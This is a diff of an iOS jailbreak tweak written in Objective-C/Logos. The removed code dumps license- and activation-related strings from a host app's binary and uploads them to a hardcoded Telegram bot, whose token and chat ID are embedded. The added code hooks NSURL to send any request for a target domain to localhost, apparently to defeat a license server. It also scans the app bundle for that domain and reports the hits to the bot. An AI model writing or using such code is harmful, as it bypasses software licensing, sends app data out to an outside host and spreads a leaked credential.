@@ -1,12 +1,16 @@
 #import <UIKit/UIKit.h>
 #import <substrate.h>
 #import <mach-o/dyld.h>
+#import <dlfcn.h>
+#import <sys/mman.h>
+#import <sys/stat.h>
 
 // --- CONFIGURATION ---
 #define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
 #define TG_CHAT_ID @"7730331218"
+#define TARGET_URL @"0devs.org"
 
-// --- HELPER ---
+// --- HELPER: TELEGRAM ---
 void sendText(NSString *text) {
     @try {
         NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
@@ -16,77 +20,89 @@ void sendText(NSString *text) {
     } @catch (NSException *e) {}
 }
 
-NSData *createBodyWithBoundary(NSString *boundary, NSString *filename, NSData *data) {
-    NSMutableData *body = [NSMutableData data];
-    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"document\"; filename=\"%@\"\r\n", filename] dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:[@"Content-Type: text/plain\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-    [body appendData:data];
-    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-    return body;
+// =========================================================
+// PART 1: THE URL SWAPPER (RUNTIME HOOK)
+// =========================================================
+// This intercepts the URL *before* the app uses it.
+// It effectively "swaps" it in memory without breaking the file signature.
+
+%hook NSURL
+
++ (instancetype)URLWithString:(NSString *)URLString {
+    if ([URLString localizedCaseInsensitiveContainsString:TARGET_URL]) {
+        // SWAP DETECTION
+        // sendText([NSString stringWithFormat:@"🚨 INTERCEPTED & SWAPPED:\n%@", URLString]);
+        
+        // Redirect to nowhere (Localhost)
+        return %orig(@"http://127.0.0.1");
+    }
+    return %orig;
 }
 
-// --- MAIN BINARY STRINGS DUMP ---
-void dumpMainBinaryStrings() {
-    // 1. Target the Main Executable
-    NSString *binaryPath = [NSBundle mainBundle].executablePath;
-    NSString *appName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
-    
-    sendText([NSString stringWithFormat:@"🕵️‍♂️ SCANNING MAIN BINARY: %@\n\nLooking for activation keywords...", [binaryPath lastPathComponent]]);
-
-    NSData *binaryData = [NSData dataWithContentsOfFile:binaryPath];
-    if (!binaryData) { sendText(@"❌ Failed to read main binary."); return; }
-    
-    const char *bytes = (const char *)[binaryData bytes];
-    NSUInteger length = [binaryData length];
-    NSMutableString *dump = [NSMutableString stringWithFormat:@"/* STRINGS DUMP FOR %@ */\n\n", appName];
-    
-    char buffer[1024];
-    int bufIndex = 0;
-    
-    // 2. Extract Strings
-    for (NSUInteger i = 0; i < length; i++) {
-        char c = bytes[i];
-        if (c >= 32 && c <= 126) {
-            if (bufIndex < 1023) buffer[bufIndex++] = c;
-        } else {
-            if (bufIndex >= 4) { // Filter short noise
-                buffer[bufIndex] = '\0';
-                NSString *str = [NSString stringWithUTF8String:buffer];
-                
-                // 3. SMART FILTER: Only save interesting strings
-                // This reduces file size and highlights the target.
-                if ([str localizedCaseInsensitiveContainsString:@"activ"] ||
-                    [str localizedCaseInsensitiveContainsString:@"license"] ||
-                    [str localizedCaseInsensitiveContainsString:@"code"] ||
-                    [str localizedCaseInsensitiveContainsString:@"valid"] ||
-                    [str localizedCaseInsensitiveContainsString:@"verify"] ||
-                    [str localizedCaseInsensitiveContainsString:@"key"] ||
-                    [str localizedCaseInsensitiveContainsString:@"serial"] ||
-                    [str localizedCaseInsensitiveContainsString:@"auth"] ||
-                    [str localizedCaseInsensitiveContainsString:@"expired"]) {
-                    
-                    [dump appendFormat:@"%@\n", str];
-                }
-            }
-            bufIndex = 0;
-        }
+- (instancetype)initWithString:(NSString *)URLString {
+    if ([URLString localizedCaseInsensitiveContainsString:TARGET_URL]) {
+        return %orig(@"http://127.0.0.1");
     }
+    return %orig;
+}
 
-    // 4. Upload
-    NSData *fileData = [dump dataUsingEncoding:NSUTF8StringEncoding];
-    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument?chat_id=%@", TG_TOKEN, TG_CHAT_ID];
-    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
-    [request setHTTPMethod:@"POST"];
-    NSString *boundary = @"Boundary-MainDump";
-    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
-    [request setHTTPBody:createBodyWithBoundary(boundary, @"Main_Binary_Keywords.txt", fileData)];
+%end
+
+// =========================================================
+// PART 2: THE HIGH-SPEED SCANNER
+// =========================================================
+// Scans every file in the bundle for the target string.
+
+void scanBundleForTarget() {
+    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSDirectoryEnumerator *enumerator = [fm enumeratorAtPath:bundlePath];
     
-    [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:nil] resume];
+    sendText([NSString stringWithFormat:@"🚀 FAST SCAN STARTED!\nSearching for '%@' in: %@", TARGET_URL, [bundlePath lastPathComponent]]);
+    
+    const char *target = [TARGET_URL UTF8String];
+    size_t targetLen = strlen(target);
+    
+    NSString *file;
+    int scannedCount = 0;
+    
+    while (file = [enumerator nextObject]) {
+        scannedCount++;
+        
+        // Skip media assets to speed up (Images/Audio don't contain code)
+        if ([file hasSuffix:@".png"] || [file hasSuffix:@".jpg"] || [file hasSuffix:@".car"]) continue;
+        
+        NSString *fullPath = [bundlePath stringByAppendingPathComponent:file];
+        
+        // 1. Map file to memory (Fastest reading method)
+        int fd = open([fullPath UTF8String], O_RDONLY);
+        if (fd == -1) continue;
+        
+        struct stat sb;
+        if (fstat(fd, &sb) == -1) { close(fd); continue; }
+        
+        if (sb.st_size == 0) { close(fd); continue; }
+        
+        void *mapped = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+        if (mapped == MAP_FAILED) { close(fd); continue; }
+        
+        // 2. Search using 'memmem' (C-level byte search)
+        if (memmem(mapped, sb.st_size, target, targetLen)) {
+            // FOUND IT!
+            sendText([NSString stringWithFormat:@"🎯 FOUND TARGET URL!\n\n📂 File: %@\n📍 Path: %@", file, fullPath]);
+        }
+        
+        // Cleanup
+        munmap(mapped, sb.st_size);
+        close(fd);
+    }
+    
+    sendText([NSString stringWithFormat:@"✅ SCAN COMPLETE.\nScanned %d files.", scannedCount]);
 }
 
 %ctor {
-    dispatch_async(dispatch_get_main_queue(), ^{
-        dumpMainBinaryStrings();
+    // Run scan in background immediately
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        scanBundleForTarget();
     });
 }
